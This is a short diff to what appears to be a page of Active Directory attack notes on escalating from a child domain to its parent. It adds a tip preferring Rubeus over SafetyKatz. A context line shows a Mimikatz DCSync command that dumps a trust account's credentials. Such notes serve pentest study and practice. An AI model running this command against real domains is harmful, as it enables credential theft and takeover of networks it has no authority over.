@@ -26,6 +26,10 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
 
 Note that krbtgt can be used instead of the trust key.
 
+{% hint style="warning" %}
+Use Rubeus section below(Personal opinion). Better than SaftyKatz.
+{% endhint %}
+
 {% code overflow="wrap" %}
 ```batch
 # Child to parent 
